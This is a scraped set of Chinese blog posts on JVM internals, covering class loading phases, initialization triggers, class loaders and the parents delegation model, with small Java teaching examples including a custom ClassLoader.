Hotspot 虚拟机会找到执行最频繁的字节码片段并把它们编译成原生机器码。编译出的原生机器码被存储在非堆内存的代码缓存中。 通过这种方法（JIT），Hotspot 虚拟机将权衡下面两种时间消耗：将字节码编译成本地代码需要的额外时间和解释执行字节码消耗更多的时间。 Reference 《深入理解Java虚拟机：JVM高级特性与最佳实践》 JVM Architecture – Understanding JVM Internals - https://www.javainterviewpoint.com/java-virtual-machine-architecture-in-java/#respond JVM（一）史上最佳入门指南 - https://www.imooc.com/article/272234 JVM基础面试题及原理讲解 - http://www.importnew.com/31126.html JVM系列(一) - JVM总体概述 - https://juejin.im/post/5b4de8185188251af86be259 Java虚拟机（JVM）概述 - http://www.importnew.com/29224.html 可能是把Java内存区域讲的最清楚的一篇文章 - https://juejin.im/post/5b7d69e4e51d4538ca5730cb 深入理解JVM类加载机制 - https://juejin.im/post/5a1d5f286fb9a045132a7100 Java虚拟机 —— 类的加载机制 - https://juejin.im/post/59c4dd9e5188257e876a1aee Jvm原理入门 - https://leeyuan.cf/2018/02/03/Jvm%E5%8E%9F%E7%90%86%E5%85%A5%E9%97%A8/ #","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】JVM-类加载机制（ClassLoad Mechanism）","date":"2019-03-06T03:04:55.000Z","path":"2019/03/06/【Java】类加载-类加载机制（ClassLoad-Mechanism）/","text":"背景虚拟机把描述类的数据从 Class 文件加载到内存，并对数据进行校验、转换解析和初始化，最终形成可以被虚拟机直接使用的 Java 类型，这就是虚拟机的类加载机制（ClassLoad Mechanism）。 注意，这里说的 Class 文件，并非指存在于具体磁盘中的某个文件，而是一串二进制的字节流，至于这个字节流从哪里获取我们是不关心的。换句话说，这个字节流可能从网络传输中获得。 类的生命周期（Life Cycle） 类从被加载到内存中开始，到卸载（Unloading）出内存，经历了加载（Loading）、链接（Linking）、初始化（Initialization）、使用（Using）四个阶段。 其中连接（Linking）又包含了验证（verification）、准备（Preparation）、解析（Resolutions）三个步骤。 加载（Loading）：通过一个类的类全局限定名（Fully Qualified Class Name）查找此类字节码文件，并利用字节码文件（.class文件），将这个字节流所代表的静态存储结构转化为方法区（method area）的运行时（runtime）数据结构。 链接（Linking）：链接是检验类或接口并准备类型和父类接口的过程。 验证（verification）：目的在于确保Class文件的字节流中包含信息符合当前虚拟机要求，不会危害虚拟机自身安全。 主要包括四种验证，文件格式验证，元数据验证，字节码验证，符号引用验证。 准备（Preparation）：分配一个结构用来存储类信息，这个结构中包含了类中定义的成员变量，方法和接口信息等。 为类变量（即在类中由static修饰的字段变量）分配内存并且设置该类变量的初始值即0（如 static int i=5; 这里只将 i 初始化为 0，至于 5 的值将在初始化阶段时赋值）。 注意，这里不会为实例变量初始化。因为类变量会分配在方法区中，而实例变量是会随着对象一起分配到 Java 堆中。 解析（Resolutions）：主要将类的常量池中的符号引用（Symbolic References）替换为直接引用（Direct References）。 符号引用（Symbolic References）是一组符号来描述目标，可以是任何字面量； 而直接引用（Direct References）就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。 初始化（Initialization）：类加载最后阶段，执行静态初始化程序，类把静态变量初始化成指定的值。 若该类具有超类，则对其进行初始化，执行静态初始化器和为类变量真正赋值（在准备阶段，只为类的 static 变量赋了该变量类型默认的值，而在初始化阶段将会为类变量真正赋值），成员变量也将被初始化。 这些步骤总体上是按照图中顺序进行的，但是Java语言本身支持运行时绑定，所以解析阶段也可以是在初始化之后进行的。以上顺序都只是说开始的顺序，实际过程中是交叉进行的，加载过程中可能就已经开始验证了。 类加载的时机在深入了解类加载机制各个阶段的细节之前，我们首先要知道什么时候类需要被加载。 然而，Java 虚拟机规范并没有约束这一点，但是，却严格规定了类必须进行初始化（Initialization）阶段的 5 种情况。很显然，加载（Loading）和链接（Linking）阶段必须在初始化（Initialization）阶段之前。 下面具体来说说这 5 种情况： 主动引用这 5 种场景中的行为称为对一个类进行主动引用。主动引用一定会触发类的初始化。 我们对上面的场景进行分别举例： 1. 遇到 new、getstatic、putstatic 或 invokestatic 这 4 条字节码指令时，如果类没有进行初始化，则需要先触发其初始化。 1234567891011121314151617181920212223242526272829303132public class NewClass &#123; public static int value = 1; static &#123; System.out.println(\"NewClass init!\"); &#125; public static void staticMethod() &#123; //System.out.println(\"staticMethod invoked\"); &#125; &#125; public class Initialization1 &#123; public static void main(String[] args) &#123; // (1) new 字节码指令 - 使用new关键字实例化对象 new NewClass(); // 输出结果 // NewClass init! // (2) getstatic 字节码指令 - 读取类的静态成员变量 int x = StaticAttributeClass.value; // 输出结果 // NewClass init! // （3）putstatic 字节码指令 - 读设置类的静态成员变量 StaticAttributeClass.value = 2; // 输出结果 // NewClass init! // （4）invokestatic 字节码指令 - 调用类的静态方法 StaticAttributeClass.staticMethod(); // 输出结果 // NewClass init! &#125; &#125; 2. 使用java.lang.reflect包的方法对类进行反射调用的时候，如果类没有进行初始化，则需要先触发其初始化。 123456789101112public class ReflectClass &#123; static &#123; System.out.println(\"ReflectClass init!\"); &#125; &#125; public class Initialization3 &#123; public static void main(String[] args) throws Exception &#123; Class classB = Class.forName(\"jvm.init.ReflectClass\"); &#125; &#125; // 输出结果 ReflectClass init! 3. 当一个类初始化的时候，如果发现其父类还没有初始化，则需要先对其父类进行初始化。 12345678910111213141516171819public class SuperClass &#123; static &#123; System.out.println(\"SuperClass init!\"); &#125; public static int value = 123; &#125; public class SubClass extends SuperClass &#123; static &#123; System.out.println(\"SubClass init!\"); &#125; &#125; public class Initialization4 &#123; public static void main(String[] args) &#123; new SubClass(); &#125; &#125; // 输出结果 SuperClass init! SubClass init! 4. 当虚拟机启动时，用户需要指定一个要执行的主类，虚拟机会先初始化这个主类。 其实就是public static void main（String[] args）所在的那个类。 1234567891011public class MainClass &#123; static &#123; System.out.println(\"MainClass init ...\"); &#125; public static void main(String[] args) &#123; System.out.println(\"main begin ...\"); &#125;&#125;//输出结果MainClass init ...main begin ... 被动引用除此之外所有引用类的方式，都不会触发初始化，因而称为被动引用。被动引用一定不会触发类的初始化。被动引用包括： 通过子类引用父类的静态变量，不会导致子类初始化。 通过数组定义类引用，用不会触发此类的初始化。 引用常量不会触发此类的初始化（常量在编译阶段就存入调用类的常量池中了） 我们仍然对上面的场景进行分别举例： 1. 通过子类引用父类的的静态字段，不会导致子类初始化 1234567891011121314151617181920public class SuperClass &#123; static &#123; System.out.println(\"SuperClass init!\"); &#125; public static int value = 123; &#125; public class SubClass extends SuperClass &#123; static &#123; System.out.println(\"SubClass init!\"); &#125; &#125; public class NotInitialization1 &#123; public static void main(String[] args) &#123; int x = SubClass.value; &#125; &#125; // 输出结果 SuperClass init! 2. 通过数组定义来引用类，不会触发此类的初始化 12345678910public class SuperClass &#123; static &#123; System.out.println(\"SuperClass init!\"); &#125; public class NotInitialization2 &#123; public static void main(String[] args) &#123; SuperClass[] sca = new SuperClass[10]; &#125; &#125; // 无任何输出 3. 常量在编译阶段会存入调用类的常量池中，本质上没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化。 123456789101112public class ConstClass &#123; static &#123; System.out.println(\"ConstClass init!\"); &#125; public static final int value = 123; &#125; public class NotInitialization3 &#123; public static void main(String[] args) &#123; int x = ConstClass.value; &#125; &#125; // 无任何输出结果 1 加载（Loading）加载是整个类加载过程的第一步。 加载阶段分为以下几步： 通过一个类的类全局限定名（Fully Qualified Class Name），获取定义此类的二进制字节流； 将这个字节流所代表的静态存储结构，转化为方法区（method area）的运行时（runtime）数据结构 在 Java 堆中生成一个代表这个类的 java.lang.Class 对象，此后，便可以通过这个类的 java.lang.Class 对象访问到这个类方法区中的数据。 注意，这里第 1 条中的二进制字节流并不只是只能从本地的 Class 文件中获取，比如还可以从 Jar 包中获取、从网络中获取（最典型的应用便是 Applet）、由其他文件生成（JSP 应用）等。 数组类的加载如果要加载的类不是数组类型，那么它就可以直接通过类加载器创建。 如果加载的类是数组类，则通过Java虚拟机创建（而不是类加载器）。 但是，数组类的元素类型（Element Type，指的是数组去掉所有维度后的类型）最终还是要靠类加载器创建，一个数据类的创建过程遵循以下规则： 如果数组的组件类型（ComponentType，指的是数组去掉一个维度的类型）是引用类型，就通过类加载器加载此组件类型，数组类将在加载该组件类型的类加载器的类名称空间上被标识； 如果数组的组件类型不是引用类型（例如int[]数组），Java虚拟机将会把数组类标记为与引导类加载器关联； 数组类的可见性与它的组件类型的可见性一致，如果组件类型不是引用类型，那数组类的可见性将默认为public。 类加载器（Class Loader）在 Java 中，默认提供的三种类加载器，分别是BootStrapClassLoader（启动类加载器）、ExtClassLoader（扩展类加载器）、AppClassLoader（应用程序类加载器）。 BootStrapClassLoader（启动类加载器）：它由 C++ 实现的，在Java程序中不能显式地获取到。它负责加载存放在 %JAVA_HOME%/jre/lib 、%JAVA_HOME%/jre/classes 以及-Xbootclasspath参数指定的路径中的类。 ExtClassLoader（扩展类加载器）：它是由sun.misc.Launcher$ExtClassLoader实现，负责加载 %JAVA_HOME%/jre/lib/ext 路径下的所有classes目录以及java.ext.dirs 系统变量指定的路径中的类库。 AppClassLoader（应用程序类加载器）：由sun.misc.Launcher$AppClassLoader来实现，它负责加载用户类路径（ClassPath）中的类，开发者可以直接使用该类加载器。一般来说，开发者自定义的类就是由应用程序类加载器加载的。 双亲委派模型（Parents Delegation model）双亲委派模型（Parents Delegation model）要求除了顶层的启动类加载器外，其余的类加载器都应当有自己的父类加载器。这里类加载器之间的父子关系不是以继承的关系来实现的，而是都使用递归的方式来调用父加载器的代码。 双亲委派模型的工作过程： 当前类加载器首先从自己已经加载的类中，查询是否此类已经加载，如果已经加载，则直接返回原来已经加载的类。 如果在当前类加载器的缓存中，没有找到期待被加载的类时，委托父类加载器去加载。父类加载器采用同样的策略，首先查看自己的缓存，然后委托父类的父类去加载，一直到 BootStrapClassLoader（启动类加载器）。 当所有的父类加载器都没有加载此类时，才由当前的类加载器加载，并将其放入自己的缓存中，以便下次有加载请求时直接返回。 类加载器加载类的隔离问题每个类加载器都有一个自己的命名空间，用来标示它加载的类。 当一个类加载器加载一个类时，它会通过保存在命名空间里的类全局限定名（Fully Qualified Class Name）进行搜索，来检测这个类是否已经被加载了。 JVM 及 Dalvik 对类唯一的识别是 ClassLoader id + PackageName + ClassName，所以一个运行程序中是有可能存在两个包名和类名完全一致的类的。并且如果这两个”类”不是由同一个类加载器加载的时，是无法将一个类的实例强转为另外一个类的，这就是类加载器隔离。 双亲委托 是类加载器类一致问题的一种解决方案，也是 Android 差价化开发和热修复的基础。 自定义类加载器一般地，在ClassLoader方法的loadClass方法中已经给开发者实现了双亲委派模型，在自定义类加载器的时候，只需要复写findClass方法即可。 2 链接（Linking）验证（verification）验证（verification）作为链接（Linking）的第一步，验证的目的是确保 Class 文件中的字节流包含的信息符合当前虚拟机的要求，而且不会危害虚拟机自身的安全。 Java虚拟机规范中关于验证阶段的规则也是在不断增加的，但大致都会完成以下四个阶段的验证：文件格式的验证、元数据的验证、字节码验证和符号引用验证。 文件格式的验证：验证字节流是否符合 Class 文件格式的规范，并且能被当前版本的虚拟机处理，该验证的主要目的是保证输入的字节流能正确地解析并存储于方法区之内。经过该阶段的验证后，字节流才会进入内存的方法区中进行存储，后面的三个验证都是基于方法区的存储结构进行的。 元数据验证：对类的元数据信息进行语义校验（其实就是对类中的各数据类型进行语法校验），保证不存在不符合 Java 语法规范的元数据信息。 字节码验证：该阶段验证的主要工作是进行数据流和控制流分析，对类的方法体进行校验分析，以保证被校验的类的方法在运行时不会做出危害虚拟机安全的行为。 符号引用验证：这是最后一个阶段的验证，它发生在虚拟机将符号引用转化为直接引用的时候（解析阶段中发生该转化），主要是对类自身以外的信息（常量池中的各种符号引用）进行匹配性的校验。 文件格式验证主要验证字节流是否符合Class文件格式规范，并且能被当前版本的虚拟机处理。 主要验证点： 是否以魔数 0xCAFEBABE 开头 主次版本号是否在当前虚拟机处理范围之内 常量池的常量是否有不被支持的类型 (检查常量tag标志) 指向常量的各种索引值中是否有指向不存在的常量或不符合类型的常量 CONSTANT_Utf8_info型的常量中是否有不符合UTF8编码的数据 Class文件中各个部分及文件本身是否有被删除的或者附加的其他信息… 实际上验证的不仅仅是这些。这阶段的验证是基于二进制字节流的，只有通过文件格式验证后，字节流才会进入内存的方法区中进行存储。 元数据验证主要对字节码描述的信息进行语义分析，以保证其提供的信息符合 Java 语言规范的要求。 主要验证点： 该类是否有父类（只有Object对象没有父类，其余都有） 该类是否继承了不允许被继承的类（被final修饰的类） 如果这个类不是抽象类，是否实现了其父类或接口之中要求实现的所有方法 类中的字段、方法是否与父类产生矛盾（例如覆盖了父类的final字段，出现不符合规则的方法重载，例如方法参数都一致，但是返回值类型却不同） 字节码验证主要是通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。在第二阶段对元数据信息中的数据类型做完校验后，字节码验证将对类的方法体进行校验分析，保证被校验类的方法在运行时不会做出危害虚拟机安全的事件。 主要有： 保证任意时刻操作数栈的数据类型与指令代码序列都能配合工作，例如不会出现类似的情况：操作数栈里的一个int数据，但是使用时却当做long类型加载到本地变量中 保证跳转不会跳到方法体以外的字节码指令上 保证方法体内的类型转换是合法的。例如子类赋值给父类是合法的，但是父类赋值给子类或者其它毫无继承关系的类型，则是不合法的。 符号引用验证最后一个阶段的校验发生在虚拟机将符号引用转化为直接引用的时候，这个转化动作将在连接的第三阶段解析阶段发生。符号引用是对类自身以外（常量池中的各种符号引用）的信息进行匹配校验。通常有： 符号引用中通过字符串描述的全限定名是否找到对应的类 在指定类中是否存在符合方法的字段描述符以及简单名称所描述的方法和字段 符号引用中的类、方法、字段的访问性（private,public,protected、default）是否可被当前类访问符号引用验证的目的是确保解析动作能够正常执行，如果无法通过符号引用验证，那么将会抛出一个java.lang.IncompatibleClassChangeError异常的子类，如java.lang.IllegalAccessError、java.lang.NoSuchFieldError、java.lang.NoSuchMethodError等。 准备（Preparation）准备阶段的任务是为类的静态字段（类变量）分配内存空间，并且以该特定类型的系统默认值初始化这些字段。 注意，这个阶段进行内存分配的仅包括类变量（被 static 修饰的变量），而不包括实例变量，实例变量将会在对象实例化时随着对象一起分配在 Java 堆中。 这个阶段不会执行任何的虚拟机字节码指令，而在初始化阶段才会显式地初始化这些字段，所以准备阶段不会做这些事情。 假设一个类变量的定义为： 1public static int value = 123; 那么变量 value 在准备阶段过后的初始值为 0，而不是 3，因为这时候尚未开始执行任何 Java 方法，而把 value 赋值为 3 的 putstatic 指令是在程序编译后，存放于类构造器方法之中的，所以把 value 赋值为 3 的动作将在初始化阶段才会执行。 下面看一下Java中所有基础类型的零值： 数据类型 零值 int 0 long 0L short (short)0 char ‘\\u0000’ byte (byte)0 boolean false float 0.0f double 0.0d reference null 这里还需要注意如下几点： 对基本数据类型来说，对于类变量（static）和全局变量，如果不显式地对其赋值而直接使用，则 JVM 会为其赋予默认的零值；而对于局部变量，若在使用前没有显式地为其赋值，则在编译时就无法通过。 对于同时被 static 和 final 修饰的常量，必须在声明的时候就为其显式地赋值，否则编译时不通过；而只被 final 修饰的常量则既可以在声明时显式地为其赋值，也可以在类初始化时显式地为其赋值，总之，在使用前必须为其显式地赋值，而 JVM 不会为其赋予默认零值。 对于引用数据类型 reference 来说，如数组引用、对象引用等，如果没有对其进行显式地赋值而直接使用，系统都会为其赋予默认的零值，即null。 如果在数组初始化时没有对数组中的各元素赋值，那么其中的元素将根据对应的数据类型而被赋予默认的零值。 一种特殊情况是，如果字段属性表中包含ConstantValue属性，那么准备阶段变量value就会被初始化为ConstantValue属性所指定的值，比如如果这样定义： 1public static final int value = 123; 在编译时，变量值就指向了一个不变常量，因此，在准备阶段，value的值就会是 123。 解析（Resolutions）解析阶段（Resolutions）是把常量池内的符号引用（Symbolic References）替换成直接引用（Direct References）的过程。 符号引用（Symbolic References） 符号引用以一组符号来描述所引用的目标，符号可以是任何形式的字面量，只要可以唯一定位到目标即可。符号引用于内存布局无关，所以所引用的对象不一定需要已经加载到内存中。各种虚拟机实现的内存布局可以不同，但是接受的符号引用必须是一致的，因为符号引用的字面量形式已经明确定义在Class文件格式中。 符号引用就是 Class 文件中的CONSTANT_Class_info、 CONSTANT_Fieldref_info、CONSTANT_Methodref_info等类型的常量。 直接引用（Direct References）：直接引用时直接指向目标的指针、相对偏移量或是一个能间接定位到目标的句柄。直接引用和虚拟机实现的内存布局相关，同一个符号引用在不同虚拟机上翻译出来的直接引用一般不会相同。如果有了直接引用，那么它一定已经存在于内存中了。 以下Java虚拟机指令会将符号引用指向运行时常量池，执行任意一条指令都需要对它的符号引用进行解析： 对同一个符号进行多次解析请求是很常见的，除了invokedynamic指令以外，虚拟机基本都会对第一次解析的结果进行缓存，后面再遇到时，直接引用，从而避免解析动作重复。 字段解析 要解析一个未被解析过的字段符号引用，首先会对字段表内class_index项中索引的 CONSTANT_Class_info 符号引用进行解析，也就是字段所属的类或接口的符号引用。 如果在解析这个类或接口符号引用的过程中出现了任何异常，都会导致字段解析失败。如果解析完成，那将这个字段所属的类或者接口用C表示，虚拟机规范要求按照如下步骤对Ｃ进行后续字段的搜索。 1 . 如果C本身包含了简单名称和字段描述符都与目标相匹配的字段，则直接返回这个字段的直接引用，查找结束。2 . 否则，如果在C中实现了接口，将会按照继承关系从下往上递归搜索各个接口和它的父接口，如果接口中包含了简单名称和字段描述符都与目标相匹配的字段，则返回这个字段的直接引用，查找结束。3 . 再不然，如果C不是java.lang.Object的话，将会按照继承关系从下往上递归搜索其父类，如果在类中包含了简单名称和字段描述符都与目标相匹配的字段，则返回这个字段的直接引用，查找结束。4 . 如果都没有，查找失败退出，抛出java.lang.NoSuchFieldError异常。如果返回了引用，还需要检查访问权限，如果没有访问权限，则会抛出java.lang.IllegalAccessError异常。 在实际的实现中，要求可能更严格，如果同一字段名在C的父类和接口中同时出现，编译器可能拒绝编译。 类方法解析 类方法解析也是先对类方法表中的class_index项中索引的方法所属的类或接口的符号引用进行解析。我们依然用C来代表解析出来的类，接下来虚拟机将按照下面步骤对C进行后续的类方法搜索。1 . 首先检查方法引用的C是否为类或接口，如果是接口，那么方法引用就会抛出IncompatibleClassChangeError异常2 . 方法引用过程中会检查C和它的父类中是否包含此方法，如果C中确实有一个方法与方法引用的指定名称相同，并且声明是签名多态方法（Signature Polymorphic Method）,那么方法的查找过程就被认为是成功的，所有方法描述符所提到的类也需要解析。对于C来说，没有必要使用方法引用指定的描述符来声明方法。3 . 否则，如果C声明的方法与方法引用拥有同样的名称与描述符，那么方法查找也是成功。4 . 如果C有父类的话，那么按照第2步的方法递归查找C的直接父类。5 . 否则，在类C实现的接口列表及它们的父接口之中递归查找是否有简单名称和描述符都与目标相匹配的方法，如果存在相匹配的方法，说明类C时一个抽象类，查找结束，并且抛出java.lang.AbstractMethodError异常。 否则，宣告方法失败，并且抛出java.lang.NoSuchMethodError。 最后的最后，如果查找过程成功返回了直接引用，将会对这个方法进行权限验证，如果发现不具备对此方法的访问权限，那么会抛出 java.lang.IllegalAccessError异常。 接口方法解析 接口方法也需要解析出接口方法表的class_index项中索引的方法所属的类或接口的符号引用，如果解析成功，依然用C表示这个接口，接下来虚拟机将会按照如下步骤进行后续的接口方法搜索。1 . 与类方法解析不同，如果在接口方法表中发现class_index对应的索引C是类而不是接口，直接抛出java.lang.IncompatibleClassChangeError异常。2 . 否则，在接口C中查找是否有简单名称和描述符都与目标匹配的方法，如果有则直接返回这个方法的直接引用，查找结束。3 . 否则，在接口C的父接口中递归查找，直到java.lang.Object类为止，看是否有简单名称和描述符都与目标相匹配的方法，如果有则返回这个方法的直接引用，查找结束。4 . 否则，宣告方法失败，抛出java.lang.NoSuchMethodError异常。 由于接口的方法默认都是public的，所以不存在访问权限问题，也就基本不会抛出java.lang.IllegalAccessError异常。 3 初始化（Initialization）初始化是类加载的最后一步，在前面的阶段里，除了加载阶段可以通过用户自定义的类加载器加载，其余部分基本都是由虚拟机主导的。但是到了初始化阶段（Initialization），才开始真正执行用户编写的 Java 代码。 在准备阶段，变量都被赋予了初始值，但是到了初始化阶段，所有变量还要按照用户编写的代码重新初始化。换一个角度，初始化阶段是执行类构造器&lt;clinit&gt;()方法的过程。 &lt;clinit&gt;()方法是由编译器自动收集类中的所有类变量的赋值动作和静态语句块(static语句块)中的语句合并生成的，编译器收集的顺序是由语句在源文件中出现的顺序决定的，静态语句块中只能访问到定义在静态语句块之前的变量，定义在它之后的变量，在前面的静态语句块中可以赋值，但是不能访问。 1234567public class Test &#123; static &#123; i=0; //可以赋值 System.out.print(i); //编译器会提示“非法向前引用” &#125; static int i=1;&#125; &lt;clinit&gt;()方法与类的构造函数&lt;init&gt;()方法不同，它不需要显示地调用父类构造器，虚拟机会宝成在子类的&lt;clinit&gt;()方法执行之前，父类的&lt;clinit&gt;()已经执行完毕，因此在虚拟机中第一个被执行的&lt;clinit&gt;()一定是java.lang.Object的。 也是由于&lt;clinit&gt;()执行的顺序，所以父类中的静态语句块优于子类的变量赋值操作，所以下面的代码段，B的值会是2。 1234567891011121314static class Parent &#123; public static int A=1; static &#123; A=2; &#125;&#125;static class Sub extends Parent&#123; public static int B=A;&#125;public static void main(String[] args) &#123; System.out.println(Sub.B);&#125; &lt;clinit&gt;()方法对于类来说不是必须的，如果一个类中既没有静态语句块也没有静态变量赋值动作，那么编译器都不会为类生成&lt;clinit&gt;()方法。 接口中不能使用静态语句块，但是允许有变量初始化的赋值操作，因此接口与类一样都会生成&lt;clinit&gt;()方法，但是接口中的&lt;clinit&gt;()不需要先执行父类的，只有当父类中定义的变量使用时，父接口才会初始化。除此之外，接口的实现类在初始化时也不会执行接口的()方法。 虚拟机会保证一个类的&lt;clinit&gt;()方法在多线程环境中能被正确的枷锁、同步。如果多个线程初始化一个类，那么只有一个线程会去执行&lt;clinit&gt;()方法，其它线程都需要等待。 Reference 深入理解JVM类加载机制 - https://juejin.im/post/5a1d5f286fb9a045132a7100 Java虚拟机 —— 类的加载机制 - https://juejin.im/post/59c4dd9e5188257e876a1aee Jvm原理入门 - https://leeyuan.cf/2018/02/03/Jvm%E5%8E%9F%E7%90%86%E5%85%A5%E9%97%A8/ Java中对类的主动引用和被动引用 - https://blog.csdn.net/u012312373/article/details/50379140","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】JVM-类加载器（Class Loader）","date":"2019-03-06T03:00:25.000Z","path":"2019/03/06/【Java】类加载-类加载器（Class-Loader）/","text":"类加载器（Class Loader）在 Java 中，默认提供的三种类加载器，分别是 BootStrapClassLoader（启动类加载器）、ExtClassLoader（扩展类加载器）、AppClassLoader（应用程序类加载器）。 同时，我们也可以定义自己的类加载器 （CustomClassLoader），那么它的 parent 肯定就是 AppClassLoader（应用程序类加载器）了。类加载器的这种层次关系称为双亲委派模型（Parents Delegation Model）。 BootStrapClassLoader（启动类加载器）：它由 C++ 实现的，在 Java 程序中不能显式地获取到。它负责加载存放在 %JAVA_HOME%/jre/lib 、%JAVA_HOME%/jre/classes 以及 -Xbootclasspath 参数指定的路径中的类。 ExtClassLoader（扩展类加载器）：它是由sun.misc.Launcher$ExtClassLoader 实现，负责加载 %JAVA_HOME%/jre/lib/ext 路径下的所有 classes 目录以及java.ext.dirs 系统变量指定的路径中的类库。 AppClassLoader（应用程序类加载器）：由sun.misc.Launcher$AppClassLoader 来实现，它负责加载用户类路径（ClassPath）中的类，开发者可以直接使用该类加载器。一般来说，开发者自定义的类就是由应用程序类加载器加载的。 分析ExtClassLoader（扩展类加载器） 作为类加载器，但它也是一个Java类，是由 BootStrapClassLoader（启动类加载器）来加载的，所以，ExtClassLoader（扩展类加载器）的 parent 是 BootStrapClassLoader（启动类加载器）。但是由于 BootStrapClassLoader（启动类加载器）是 C++ 实现的，我们通过 ExtClassLoader.getParent 获取到的是 null。同样地，AppClassLoader（应用程序类加载器）是由 ExtClassLoader（扩展类加载器）加载，AppClassLoader（应用程序类加载器）的parent是 ExtClassLoader（扩展类加载器）。 类加载器加载类的隔离问题每个类加载器都有一个自己的命名空间，用来标示它加载的类。 当一个类加载器加载一个类时，它会通过保存在命名空间里的类全局限定名（Fully Qualified Class Name）进行搜索，来检测这个类是否已经被加载了。 JVM 及 Dalvik 对类唯一的识别是 ClassLoader id + PackageName + ClassName，所以一个运行程序中是有可能存在两个包名和类名完全一致的类的。并且如果这两个”类”不是由同一个类加载器加载的时，是无法将一个类的实例强转为另外一个类的，这就是类加载器隔离。 双亲委托 是类加载器类一致问题的一种解决方案，也是 Android 差价化开发和热修复的基础。 自定义类加载器一般地，在ClassLoader方法的loadClass方法中已经给开发者实现了双亲委派模型，在自定义类加载器的时候，只需要复写findClass方法即可。 1234567891011121314151617181920212223242526272829303132333435363738public class CustomClassLoader extends ClassLoader &#123; private String root; public CustomClassLoader(String root) &#123; this.root = root; &#125; @Override protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; byte[] classData = loadClassData(name); if (classData == null) &#123; throw new ClassNotFoundException(); &#125; else &#123; return defineClass(name, classData, 0, classData.length); &#125; &#125; private byte[] loadClassData(String name) &#123; String fileName = root + File.separatorChar + name.replace('.', File.separatorChar) + \".class\"; try &#123; InputStream ins = new FileInputStream(fileName); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 1024; byte[] buffer = new byte[bufferSize]; int length; while ((length = ins.read(buffer)) != -1) &#123; baos.write(buffer, 0, length); &#125; return baos.toByteArray(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return null; &#125;&#125; 新建一个类com.xiao.U，编译成class文件，放到桌面，来测试一下： 123456789101112public class Test &#123; public static void main(String[] args) &#123; CustomClassLoader customClassLoader = new CustomClassLoader(\"C:\\\\Users\\\\PC\\\\Desktop\"); try &#123; Class clazz = customClassLoader.loadClass(\"com.xiao.U\"); Object o = clazz.newInstance(); System.out.println(o.getClass().getClassLoader()); &#125; catch (ClassNotFoundException | IllegalAccessException | InstantiationException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 打印结果： 1CustomClassLoader@1540e19d 自定义类加载器在可以实现服务端的热部署，在移动端比如android也可以实现热更新。 Reference 深入理解JVM类加载机制 - https://juejin.im/post/5a1d5f286fb9a045132a7100 Java虚拟机 —— 类的加载机制 - https://juejin.im/post/59c4dd9e5188257e876a1aee","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】JVM 入门","date":"2019-03-06T01:55:29.000Z","path":"2019/03/06/【Java】JVM-入门/","text":"前言JVM 是 Java Virtual Machine（ Java 虚拟机）的缩写，JVM是一种用于计算设备的规范，它是一个虚构的计算机，是通过在实际的计算机上仿真模拟各种计算机功能来实现的。 JVM屏蔽了与具体操作系统平台相关的信息，使 Java 程序只需生成在 Java 虚拟机上一次编译，多次运行（write once, run anywhere），具有跨平台性。JVM 在执行字节码时，实际上最终还是把字节码解释成具体平台上的机器指令执行。 JDK、JRE和JVM对比 JDKJDK（Java Development Kit) 是 Java 语言的软件开发工具包（SDK）。JDK 是 programming tools、JRE 和 JVM 的一个集合。 JREJRE（Java Runtime Environment）Java 运行时环境，JRE 是物理存在的，主要由 Java API 和 JVM 组成，提供了用于执行 Java 应用程序最低要求的环境。 JVMJVM是一种用于计算设备的规范，它是一个虚构的计算机的软件实现，简单的说，JVM 是运行字节码（Byte Code）程序的一个容器。 HotSpot VMHotSpot VM 是 Sun JDK 和 OpenJDK 中所带的虚拟机，也是目前使用范围最广的 Java 虚拟机。 JVM 的特点 基于堆栈的虚拟机：最流行的计算机体系结构，如英特尔 X86 架构和 ARM 架构上运行基于 寄存器。比如，安卓的 Davilk 虚拟机就是基于 寄存器 结构，而 JVM 是基于栈结构的。 符号引用（symbolic references） ：除了基本类型以外的数据 （比如类和接口） ，都是通过符号来引用，而不是通过显式地使用内存地址来引用。 垃圾收集 ：一个类的实例是由用户程序创建和垃圾回收自动销毁。 网络字节顺序 ：Java class文件用网络字节码顺序来进行存储，保证了小端的Intel x86架构和大端的RISC系列的架构之间的无关性。 JVM 字节码（JVM Byte Code）JVM 使用 Java 字节码的方式，作为 Java 用户语言 和 机器语言 之间的中间语言。实现一个通用的、机器无关 的执行平台。 类文件格式有趣的是，其实JVM并不关心Java语言或其他编程语言的语义和语法结构。当JVM执行一段程序的时候，它主要关注的是一种称为“类文件”的特定文件格式。 .class 类文件格式和 Java 代码定义的面向对象的类结构毫无关系。编译器将 .java 文件编译成 .class 文件，然后 JVM 对*.class文件进行解译，它不关心这个类文件是由哪种编译器生成的，只要符合类文件的文件格式即可。 Java编译器将一段程序编译为等价的类文件。这些类文件实际上包含了半编译的代码——字节码（byte code）。 之所以称之为半编译，是因为字节码并不像C/C++编译器编译的与机器指令相关的二进制文件一样可以被被直接执行。 字节码要先被输入到 JVM 中，然后再转换为底层平台可以执行的最终指令。所以字节码包含了JVM的指令、符号表和其他的辅助信息。不管何种语言，能根据JVM的语法和结构约束编译生成字节码的编译器，都是一个可以在JVM上执行的候选者。 JVM的定位JVM将自身定位于字节码和底层平台之间。底层平台是指操作系统（OS）和硬件。 操作系统和硬件体系结构在不同的机器上可能不同，但是同一段Java程序可以不用做任何的代码修改就能在不同的机器上运行。这是在虚拟环境中执行的程序语言的独特之处。 例如，由其他程序语言编译器编译的目标代码如C++和Java相比的不同点在于，C++程序需要被特定平台的编译器重新编译，从而使它能在不同的体系结构上面运行。而Java代码并不需要做任何改变，因为由Java编译器编译的字节码是在外围的JVM上执行。 